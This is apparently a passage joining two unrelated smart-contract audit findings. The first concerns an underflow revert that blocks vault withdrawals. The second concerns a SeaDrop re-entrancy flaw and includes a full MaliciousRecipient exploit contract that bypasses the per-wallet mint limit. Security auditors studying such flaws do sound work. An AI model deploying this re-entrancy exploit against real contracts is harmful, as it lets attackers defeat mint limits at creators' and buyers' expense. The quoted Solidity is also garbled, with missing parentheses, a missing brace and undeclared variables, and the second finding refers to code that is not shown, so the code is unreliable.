calculateVariableWithdrawState() is used to calculate the ethAmountOwed, which is the balance of unwithdrawn earnings. This is computed using the variable participant share of the totalEarnings, subtracted by previousWithdrawnAmount (see code below).
```solidity
function calculateVariableWithdrawState(
    uint256 totalEarnings,
    uint256 previousWithdrawnAmount
) internal view returns (uint256, uint256) {
    uint256 bearerBalance = variableBearerToken.balanceOf(msg.sender);
    require(bearerBalance > 0, "NBT");
    //@audit this can revert if participant share of earnings is less than previousWithdrawnAmount
    uint256 ethAmountOwed = bearerBalance.mulDiv(totalEarnings, variableBearerToken.totalSupply()) - previousWithdrawnAmount;
    return (ethAmountOwed + previousWithdrawnAmount, ethAmountOwed);
```
The issue is that the computation assumes that bearerBalance.mulDiv(totalEarnings, variableBearerToken.totalSupply()) will always be greater than previousWithdrawnAmount. However, there are edge cases that breaks that assumption, 1. When a negative rebase occurs, causing totalEarnings during vault-end withdrawal to be much lower than earlier withdrawals. 2. when admin settle debt with a negative earning, ending the vault with a lower totalEarnings than earlier. When these occur, it will cause calculateVariableWithdrawState() to revert in vaultEndedWithdraw(), preventing the affected variable participant from withdrawing his share of feeEarnings (see code below).
```solidity
function vaultEndedWithdraw(uint256 side) internal {
    if (totalEarnings > 0) {
        //@audit this could reverts due to edge cases where participant share of totalEarnings < previous withdrawn earnings that will prevent the affected participants from withdrawing fee earnings, which is executed below
        uint256 currentState,
        uint256 stakingEarningsShare
        ) = calculateVariableWithdrawState(
            totalEarnings,
            variableToWithdrawnStakingEarnings[msg.sender]
        );
        stakingShareAmount = stakingEarningsShare;
        variableToWithdrawnStakingEarnings[msg.sender] = currentState;
    }
    uint256 feeShareAmount = 0;
    uint256 totalFees = withdrawnFeeEarnings + feeEarnings;
    if (totalFees > 0) {
        uint256 currentState,
        uint256 feesShare
        ) = calculateVariableWithdrawState(
            totalFees,
            variableToWithdrawnFees[msg.sender]
        );
        feeShareAmount = feesShare;
        variableToWithdrawnFees[msg.sender] = currentState;
    }
    vaultEndedStakingEarnings -= stakingShareAmount;
    feeEarnings -= feeShareAmount;
    variableBearerToken.burn(msg.sender, bearerBalance);
    uint256 sendAmount = stakingShareAmount + feeShareAmount;
    sendFunds(sendAmount);
    emit VariableFundsWithdrawn(sendAmount, msg.sender, isStarted(), isEnded());
    return;
}
```

In case of a mintPublic call, the function _checkMintQuantity checks whether the minter has exceeded the parameter maxMintsPerWallet, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check. The following is an example contract that can be employed by the feeRecipent (assume that maxMintsPerWallet is 1):
```solidity
contract MaliciousRecipient {
    bool public startAttack;
    address public token;
    SeaDrop public seaDrop;

    fallback() external payable {
        if (startAttack) {
            startAttack = false;
            seaDrop.mintPublic{value: 1 ether}({
                nftContract: token,
                feeRecipient: address(this),
                minterIfNotPayer: address(this),
                quantity: 1
            });
        }
    }

    // Call `attack` with at least 2 ether.
    function attack(SeaDrop _seaDrop, address _token) external payable {
        token = _token;
        seaDrop = _seaDrop;
        startAttack = true;
        _seaDrop.mintPublic{value: 1 ether}({
            nftContract: _token,
            feeRecipient: address(this),
            minterIfNotPayer: address(this),
            quantity: 1
        });
        token = address(0);
        seaDrop = SeaDrop(address(0));
    }
}
```
This is especially bad when the parameter PublicDrop.restrictFeeRecipients is set to false, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users, i.e., should be part of _allowedFeeRecipients[nftContract] mapping, would be able to circumvent the check--lower severity due to needed privileged access. Also, creatorPaymentAddress can use re-entrancy to get around the same check. See SeaDrop.sol#L571.

